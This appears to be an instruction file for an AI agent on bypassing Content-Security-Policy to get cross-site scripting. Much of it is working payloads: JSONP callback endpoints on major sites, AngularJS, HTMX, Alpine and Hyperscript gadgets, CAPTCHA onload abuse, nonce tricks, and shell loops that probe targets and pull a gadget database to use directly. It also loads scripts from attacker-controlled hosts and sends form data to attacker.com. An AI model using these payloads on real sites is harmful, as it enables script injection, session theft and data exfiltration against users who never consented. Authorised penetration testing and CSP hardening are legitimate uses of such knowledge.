---
name: csp-bypass
description: Bypass Content-Security-Policy to achieve XSS when CSP blocks inline scripts. Covers JSONP gadgets, framework abuse (Angular/HTMX/Alpine), missing directive exploitation, and nonce/hash weaknesses. Use when you have HTML injection but CSP prevents script execution.
---

# CSP Bypass

## When to Use
- You have HTML injection (reflected or stored) but CSP blocks inline `<script>` execution
- Target has a CSP header and you need to evaluate it for weaknesses
- You found XSS in a CSP-protected application and need to escalate to full JS execution

## Triage: Parse the CSP First
Extract the CSP header and evaluate systematically:
```bash
curl -sI https://target.com | grep -i content-security-policy
```

Check for fatal weaknesses before attempting bypasses:
1. **`unsafe-inline` without nonce/hash** = inline `<script>alert(1)</script>` works directly
2. **`unsafe-eval`** = `eval()`, `setTimeout('string')`, `new Function('string')` all work
3. **`data:` in script-src** = `<script src="data:text/javascript,alert(1)"></script>`
4. **`blob:` in script-src** = construct and execute blob URLs
5. **Missing `script-src` AND `default-src`** = no script restrictions at all
6. **`Report-Only` mode** = CSP is not enforced, only logged. Full XSS works.
7. **`strict-dynamic`** = nonce-created scripts can load additional scripts (bypass whitelist)
8. **`*` wildcard** = any domain allowed, load attacker-hosted JS

## Bypass Techniques

### 1. JSONP Callback Injection (most common bypass)
If CSP whitelists a domain that has a JSONP endpoint, inject a `<script>` tag pointing to it with your payload as the callback.

**Pattern**: `<script src="https://whitelisted.com/api?callback=alert(document.domain)//"></script>`

**High-value JSONP endpoints by whitelisted domain**:

| CSP allows | JSONP endpoint |
|------------|----------------|
| `*.google.com`, `accounts.google.com` | `/o/oauth2/revoke?callback=` |
| `*.google.com`, `www.google.com` | `/complete/search?client=chrome&jsonp=` |
| `*.googleapis.com`, `maps.googleapis.com` | `/maps/api/js?callback=` |
| `apis.google.com` | `/js/googleapis.proxy.js?onload=` |
| `*.facebook.com`, `graph.facebook.com` | `/?id=1337&callback=` |
| `*.twitter.com`, `api.twitter.com` | `/1/statuses/oembed.json?callback=` |
| `*.youtube.com` | `/oembed?callback=` |
| `*.reddit.com` | `/.json?jsonp=` |
| `api.github.com` | `/search/code?callback=` |
| `*.wordpress.com`, `*.wordpress.org` | `?_jsonp=` |
| `*.bing.com` | `/osjson.aspx?JsonCallback=` |
| `api.flickr.com` | `/services/feeds/...?jsoncallback=` |
| `*.wikipedia.org` | `/w/api.php?callback=` |
| `*.paypal.com` | `/checkoutnow/remembered?callback=` |
| `*.amazon.com` | `/e/xsp/getAdj?callback=` |

**Callback parameter names to try**: `callback`, `cb`, `jsonp`, `_callback`, `jsonpCallback`, `_jsonp`, `func`, `onload`, `j`

**To find JSONP endpoints on any whitelisted domain**:
```bash
# Search for JSONP patterns in JS files via jxscout
jxscout-pro-v2 -c get-matches --kind jsonp-endpoint

# Probe common JSONP paths
for p in "/api?callback=test" "/?callback=test" "/search?jsonp=test" \
         "/v1/endpoint?cb=test" "/?_jsonp=test"; do
  curl -sk "https://whitelisted-domain.com${p}" | head -1
done
```

### 2. AngularJS Template Injection
If CSP whitelists a CDN serving AngularJS (1.x), load it and use Angular directives instead of `<script>`.

**CDNs that serve exploitable Angular**: `ajax.googleapis.com`, `cdn.jsdelivr.net`, `cdnjs.cloudflare.com`, `unpkg.com`, `code.angularjs.org`, `cdn.bootcdn.net`

**Payload (modern Angular 1.6+, with ng-csp for CSP compat)**:
```html
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
</div>
```

**Payload (ng-on-error, Angular 1.8.x)**:
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
<div ng-app><img src=x ng-on-error="$event.target.ownerDocument.defaultView.alert(origin)"></div>
```

**Special case -- Google reCAPTCHA bundles Angular**:
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
<img src=x ng-on-error="$event.target.ownerDocument.defaultView.alert(1)">
```

### 3. CAPTCHA onload Callback
CAPTCHA loaders accept `onload` parameter that calls any global function:
```html
<script src="https://www.google.com/recaptcha/api.js?onload=alert"></script>
<script src="https://hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=alert"></script>
```

### 4. CDN-Hosted Attacker JS
If CSP whitelists a CDN that serves user-uploaded content:
```html
<!-- jsDelivr serves any GitHub repo -->
<script src="https://cdn.jsdelivr.net/gh/attacker/repo/payload.js"></script>

<!-- unpkg serves any npm package -->
<script src="https://unpkg.com/attacker-package/payload.js"></script>

<!-- Shopify file hosting -->
<script src="https://cdn.shopify.com/s/files/1/.../payload.js"></script>
```

### 5. HTMX / Alpine / Hyperscript Gadgets
If CSP whitelists CDNs serving these frameworks:

**HTMX** (event trigger parser breakout):
```html
<script src="https://cdn.jsdelivr.net/npm/htmx.org"></script>
<div hx-trigger="x[1)}),alert(origin)//]">click</div>
```

**AlpineJS** (`x-init` executes JS):
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.10.5/cdn.min.js"></script>
<div x-init="alert(1)">test</div>
```

**Hyperscript** (`_` attribute is a JS DSL):
```html
<script src="https://unpkg.com/hyperscript.org"></script>
<x _="on load alert(1)">test</x>
```

### 6. Missing Directive Exploitation

**No `base-uri`** -- redirect all relative script loads to attacker server:
```html
<base href="https://attacker.com/">
<!-- All relative <script src="/app.js"> now loads from attacker.com/app.js -->
```

**No `object-src`** -- embed Flash/Java (legacy browsers):
```html
<object data="https://attacker.com/payload.swf"></object>
<embed src="https://attacker.com/payload.swf">
```

**No `form-action`** -- exfiltrate data via form submission:
```html
<form action="https://attacker.com/steal" method="POST">
  <!-- existing form fields get submitted to attacker -->
</form>
```

**No `frame-ancestors`** -- clickjacking (not XSS, but chainable):
```html
<iframe src="https://target.com/sensitive-action" style="opacity:0">
```

### 7. Nonce/Hash Weaknesses

**Predictable nonces** -- if nonce is static, reused, or based on timestamp:
```html
<!-- If nonce="abc123" is always the same -->
<script nonce="abc123">alert(1)</script>
```

**Nonce via DOM** -- if the page puts the nonce in a DOM-accessible location:
```javascript
// If nonce is in a meta tag or data attribute, read it and inject
document.querySelector('[nonce]').nonce
```

**`strict-dynamic` with nonce** -- if you can inject into a nonce'd script, any scripts IT creates are trusted:
```html
<!-- If you control part of a nonce'd script's input -->
<script nonce="valid">
  var x = "USER_INPUT";  // inject: ";document.write('<script>alert(1)<\/script>');"
</script>
```

### 8. Script Gadgets in Existing Libraries
If the page already loads a library, exploit its DOM-processing behavior:

**jQuery + Bootstrap `data-target`**:
```html
<button data-toggle="modal" data-target="$('body').append('<img src=x onerror=alert(1)>')">click</button>
```

**Prototype.js `evalScripts`**:
```html
<!-- Prototype.js auto-evaluates scripts in AJAX responses -->
```

## Evaluation Procedure

### Step 1: Parse and check instant wins
```bash
CSP=$(curl -sI https://target.com | grep -i 'content-security-policy:' | cut -d: -f2-)
echo "$CSP"

# Instant wins
echo "$CSP" | grep -qi "unsafe-inline" && echo "UNSAFE-INLINE PRESENT"
echo "$CSP" | grep -qi "unsafe-eval" && echo "UNSAFE-EVAL PRESENT"
echo "$CSP" | grep -qi "data:" && echo "DATA: URI ALLOWED"
echo "$CSP" | grep -qi "report-only" && echo "REPORT-ONLY (NOT ENFORCED)"

# Missing directives
for d in "base-uri" "object-src" "form-action" "frame-ancestors"; do
  echo "$CSP" | grep -qi "$d" || echo "MISSING: $d"
done
```

### Step 2: Extract whitelisted domains
```bash
echo "$CSP" | tr ';' '\n' | grep -i "script-src\|default-src" | tr ' ' '\n' | \
  grep -vE "^'|^$" | sort -u
```

### Step 3: Match against built-in gadget table
Cross-reference extracted domains against the JSONP/Angular/CDN tables in this skill (sections 1-5 above). If a whitelisted domain appears in the tables, use the corresponding payload directly.

### Step 4: Ground-truth lookup via cspbypass.com
If built-in tables don't cover a whitelisted domain, fetch the authoritative gadget database (241 entries covering JSONP, Angular, HTMX, Alpine, CDN abuse):

```bash
# Fetch the bypass database
curl -sk "https://cspbypass.com/data.tsv" -o /tmp/csp-gadgets.tsv

# Search for each whitelisted domain
for domain in $(echo "$CSP" | tr ';' '\n' | grep -i "script-src\|default-src" | \
  tr ' ' '\n' | grep -vE "^'|^$" | sort -u); do
  matches=$(grep -i "${domain}" /tmp/csp-gadgets.tsv)
  [ -n "$matches" ] && echo "=== BYPASS FOUND: $domain ===" && echo "$matches"
done
```

The database returns tab-separated rows: `domain \t payload \t description`. Use the payload directly as your bypass PoC.

### Step 5: Manual JSONP hunting (if no database matches)
If neither the built-in table nor cspbypass.com covers the whitelisted domains, hunt for JSONP endpoints manually:
```bash
# Probe common JSONP paths on whitelisted domains
for p in "?callback=alert" "?cb=alert" "?jsonp=alert" "?_callback=alert" \
         "?onload=alert" "?_jsonp=alert" "?func=alert"; do
  curl -sk "https://whitelisted-domain.com/api${p}" | head -1
done

# Check jxscout for JSONP patterns in target JS
jxscout-pro-v2 -c get-matches --kind jsonp-endpoint
```

### Philosophy
**Prefer the built-in table for speed, fall back to cspbypass.com for coverage.** The built-in table covers the 15 highest-frequency bypass domains. The cspbypass.com database covers 241 domains including niche ad networks, analytics, and regional CDNs. If both miss, manual JSONP hunting on the whitelisted domain is the last resort.

## Chain With
- dom-vulnerability-detection (find HTML injection point that CSP blocks)
- dompurify-mxss-bypass (bypass sanitizer to get HTML injection, then bypass CSP)
- crlf-response-splitting (inject CSP-relaxing headers via CRLF)
- content-type-mime-diff (serve JS as different MIME type)

## References
- https://cspbypass.com/ (JSONP/gadget database, 241 entries)
- https://github.com/renniepak/CSPBypass
- https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
